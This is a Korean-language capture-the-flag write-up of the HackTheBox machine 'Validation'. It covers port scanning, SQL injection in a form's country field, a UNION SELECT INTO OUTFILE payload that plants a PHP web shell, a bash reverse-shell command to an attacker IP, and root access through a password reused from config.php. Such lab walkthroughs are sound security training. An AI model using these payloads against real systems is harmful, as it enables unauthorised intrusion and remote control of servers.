# Validation
- [Port-Scanning](https://github.com/jdh5772/Practice_Cyber_Security/blob/main/HackTheBox/Validation.md#port-scanning)
- [HTTP](https://github.com/jdh5772/Practice_Cyber_Security/blob/main/HackTheBox/Validation.md#http80)
- [Login as www-data](https://github.com/jdh5772/Practice_Cyber_Security/blob/main/HackTheBox/Validation.md#login-as-www-data)
- [Privesc](https://github.com/jdh5772/Practice_Cyber_Security/blob/main/HackTheBox/Validation.md#privesc)

## Port-Scanning
```bash
sudo nmap -p 22,80,4566,8080 -sC -sV -vv -oA validation 10.129.164.206
```
<img width="1205" height="587" alt="image" src="https://github.com/user-attachments/assets/b4f0e5af-1a81-403a-ab38-e10f3316e675" />

- SSH
- HTTP(80)
- HTTP(4566)
- HTTP(8080)

## HTTP(80)
### Banner Grabbing
- `Apache`
- `PHP`
<img width="1203" height="301" alt="image" src="https://github.com/user-attachments/assets/135774c7-b286-48e7-b160-35091f2a5e90" />

### SQL Injection
- 웹 서버에 접속해서 `Username` 입력란에 입력후 `Join Now` 버튼을 누르면 해당 유저명과 국가명으로 출력이 된다.
- 새로고침이나 쿠키를 초기화 하더라도 해당 정보가 남아 있는 것으로 보인다.
<img width="793" height="396" alt="image" src="https://github.com/user-attachments/assets/ceddb56e-11b3-44aa-87bb-f7c2a0b908de" />

<br>
<br>

- `Burpsuite`를 사용하여 `Join Now`버튼 클릭을 가로채서 확인해보니 리다이렉션이 일어나고 있다.
- 리다이렉션을 따라가면 위의 저장되어 있는 정보 창으로 가게 된다.
<img width="1203" height="447" alt="image" src="https://github.com/user-attachments/assets/81bfc228-1bca-47c8-9fa0-d102f195e707" />

<br>
<br>

- `username`에 SQL Injection을 시도하여 리다이렉션을 따라갔으나 문제가 발생하지 않았음.
```
username=asdf'&country=Brazil
```
<img width="775" height="391" alt="image" src="https://github.com/user-attachments/assets/c5d73036-a008-444f-ae08-d655c852d7d3" />
<img width="1536" height="675" alt="image" src="https://github.com/user-attachments/assets/4fa5fb1b-350d-4b26-a6ff-65e8b0740c41" />

<br>
<br>

- `country`에 Injection을 시도하여 리다이렉션을 따라가니 오류가 발생.
```
username=asdf&country=Brazil'
```
<img width="775" height="391" alt="image" src="https://github.com/user-attachments/assets/07d68bf0-307e-409e-8ed0-ae8ec819ea2f" />
<img width="1537" height="594" alt="image" src="https://github.com/user-attachments/assets/27cac9d6-361d-44bd-8819-abb458363060" />

<br>
<br>

- `UNION SELECT`를 시도하여 오류없이 전송 성공.
<img width="772" height="408" alt="image" src="https://github.com/user-attachments/assets/d2bc0917-7d04-48d8-bd99-0db0dc974f69" />
<img width="766" height="590" alt="image" src="https://github.com/user-attachments/assets/f298f6cf-bcb3-47bd-b39e-1b957f0fd0b7" />

<br>
<br>

- DB자체의 데이터를 수집할 수 있지만, `PHP`를 사용하고 있어 파일을 업로드 할 수 있을지 시도.
- 경로는 확인하지 못해서 기존 웹서버의 경로를 시도.
```
username=asdf&country=Brazil' UNION SELECT "<?php phpinfo(); ?>" INTO OUTFILE "/var/www/html/info.php";-- -
```
<img width="772" height="422" alt="image" src="https://github.com/user-attachments/assets/7235b72f-056f-4c0f-94d4-ae5533e22f5a" />

<br>
<br>

- 리다이렉션에서 에러 메시지가 출력되었으나, `/info.php` 경로로 접속이 가능.
<img width="772" height="582" alt="image" src="https://github.com/user-attachments/assets/87725720-d7f0-41b0-a6fc-942fb6f76963" />
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/2200ecdf-f519-4a0e-a82d-235c03164030" />

<br>
<br>

- 웹 셸 업로드를 시도하여 성공.
- 리다이렉션까지 따라가줘야 성공하는 것 같다.
```
username=asdf&country=Brazil' UNION SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/html/ex.php";-- -
```
<img width="772" height="425" alt="image" src="https://github.com/user-attachments/assets/6bfa792c-c0cd-4bed-8891-8eb12e60e9e7" />
<img width="489" height="81" alt="image" src="https://github.com/user-attachments/assets/1bfbc7a5-462b-4980-aceb-39e4f1aa06f2" />

## Login as www-data
- `Burpsuite`를 사용하여 리버스 셸 코드 실행.(URL Encoding)
```
cmd=bash -c 'bash -i >&/dev/tcp/10.10.14.13/9001 0>&1'
```
<img width="772" height="354" alt="image" src="https://github.com/user-attachments/assets/61903302-ecd8-411c-91e3-41cf2e409453" />

<br>
<br>

- 셸 획득.
<img width="1204" height="223" alt="image" src="https://github.com/user-attachments/assets/c5e490f0-21e5-4754-8fb9-307e0049fbfd" />

<br>
<br>

- `python`이 존재하지 않아서 `script`를 사용하여 tty 업그레이드.
```bash
/usr/bin/script -qc /bin/bash
```
<img width="1204" height="54" alt="image" src="https://github.com/user-attachments/assets/4252240b-34d9-4c62-95e6-546d40a11380" />

## Privesc
- `/var/www/html/config.php` 발견.
<img width="1204" height="293" alt="image" src="https://github.com/user-attachments/assets/433e360a-d8b6-4808-b8d9-cf3cdf3d3618" />

<br>
<br>

- 해당 파일에서 비밀번호가 입력되어 있음.
<img width="1204" height="217" alt="image" src="https://github.com/user-attachments/assets/8d42ca08-ee1e-450f-89b9-ca07c87d2314" />

<br>
<br>

- `uhc-9qual-global-pw` 비밀번호를 사용하여 `root` 로그인 시도하여 성공.
<img width="1204" height="98" alt="image" src="https://github.com/user-attachments/assets/c4b0dfcd-c8fc-4952-8468-580c4afe5228" />
